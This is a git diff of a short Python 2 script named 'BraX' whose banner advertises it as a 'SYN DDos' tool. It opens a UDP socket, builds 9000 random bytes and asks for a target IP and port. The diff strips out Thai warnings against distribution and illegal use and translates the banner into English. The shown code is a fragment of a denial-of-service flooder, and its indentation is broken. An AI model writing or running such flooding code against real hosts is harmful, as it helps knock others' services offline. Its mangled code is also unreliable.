@@ -1,4 +1,3 @@
-# เป็นรุ่นทดสอบเท่านั้นห้ามนำไปเผยแพร่หรือขาย
 # BraX
 
  
@@ -7,18 +6,20 @@ import sys
 import random
 import socket
 
+##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(9000)
+#############
 
 	os.system("clear")
 	print "#############################"
 	print "#         BraX V.1          #"
 	print "#############################"
-	print "#     ยินดีต้อนรับสู่ SYN DDos    #"
+	print "#    Welcome to SYN DDos    #"
 	print "#############################"
 	print "Author   : BraX"
   print "Facebook : https://m.facebook.com/J.cknew"
-  print "เป็นรุ่น DEMO ห้ามนำไปจำหน่ายหรือดัดแปลงและห้ามนำไปใช้ในทางผิดกฎหมาย"
+  print "Verion Demo"
 
 ip = raw_input("IP : ")
 port = input("Port : ") 
